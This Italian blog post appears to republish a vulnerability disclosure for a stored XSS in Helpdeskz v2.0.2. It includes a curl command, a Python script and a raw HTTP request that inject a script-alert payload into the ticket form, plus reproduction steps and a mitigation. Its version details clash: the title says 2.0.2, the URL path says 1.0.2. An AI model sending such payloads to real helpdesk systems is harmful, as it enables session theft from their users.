---
layout: post
title: '[webapps] Helpdeskz v2.0.2 - Stored XSS' 
date: 2024-08-23
categories: [security, ransomware]
---

# [webapps] Helpdeskz v2.0.2 - Stored XSS

## Introduzione
Questo articolo descrive una vulnerabilità XSS (Cross-Site Scripting) riscontrata nella versione 2.0.2 del software Helpdeskz. Le vulnerabilità XSS consentono a un attaccante di iniettare script dannosi nelle pagine web visualizzate da altri utenti. Questa specifica vulnerabilità è caratterizzata come "Stored XSS", il che significa che il codice dannoso viene permanentemente memorizzato sul server target e viene eseguito ogni volta che un utente visualizza la pagina web vulnerabile.

## Dettagli della Vulnerabilità
La vulnerabilità si manifesta all'interno del modulo di invio dei ticket del software Helpdeskz. Un attaccante può inviare un ticket contenente codice JavaScript malevolo che viene memorizzato nel database del server. Quando un utente successivamente visualizza questo ticket, il codice JavaScript viene eseguito nel browser dell'utente.

## Esempio di Payload Semplice
Il seguente comando `curl` può essere utilizzato per inviare un ticket contenente codice JavaScript malevolo:

```bash
curl 'http://localhost/helpdeskz_v1.0.2/uploads/index.php' --data 'title=<script>alert("XSS");</script>&content=<script>alert("XSS");</script>&submit=Submit'
```

## Conversione in Python del Payload Semplice
Il seguente script Python può essere utilizzato come alternativa al comando `curl` di cui sopra:

```python
import requests

url = "http://localhost/helpdeskz_v1.0.2/uploads/index.php"
data = {
    'title': '<script>alert("XSS");</script>',
    'content': '<script>alert("XSS");</script>',
    'submit': 'Submit'
}
response = requests.post(url, data=data)
```

## Spiegazione Tecnica
Il comando `curl` e lo script Python effettuano una richiesta HTTP POST al server target. Il corpo della richiesta contiene i dati del ticket, tra cui il titolo e il contenuto del ticket, entrambi contenenti codice JavaScript malevolo.

## Procedura per Riprodurre la Vulnerabilità
1. Eseguire il comando `curl` o lo script Python sopra indicato.
2. Aprire il ticket inviato sul server target.
3. Il codice JavaScript iniettato verrà eseguito nel browser.

## Richiesta HTTP
La richiesta HTTP inviata al server è la seguente:

```http
POST /helpdeskz_v1.0.2/uploads/index.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

title=<script>alert("XSS");</script>&content=<script>alert("XSS");</script>&submit=Submit
```

## Impatto della Vulnerabilità
Questa vulnerabilità può permettere a un attaccante di rubare informazioni sensibili, come i cookie di sessione, permettendogli di impersonare altri utenti. Può anche essere utilizzata per eseguire altre attività malevole, come defacement del sito web o attacchi di phishing.

## Patch e Mitigazioni
Al momento della pubblicazione di questa vulnerabilità, non era disponibile alcuna patch. Tuttavia, i gestori dei sistemi possono mitigare l'impatto di questa vulnerabilità filtrando o disinfettando l'input degli utenti per rimuovere i tag script prima di salvarli nel database.

## Conclusione
Questa vulnerabilità sottolinea l'importanza di implementare controlli di sicurezza adeguati quando si gestiscono input degli utenti in un'applicazione web. È essenziale che gli sviluppatori si impegnino a scrivere codice sicuro che preveda e gestisca adeguatamente le potenziali minacce di sicurezza.

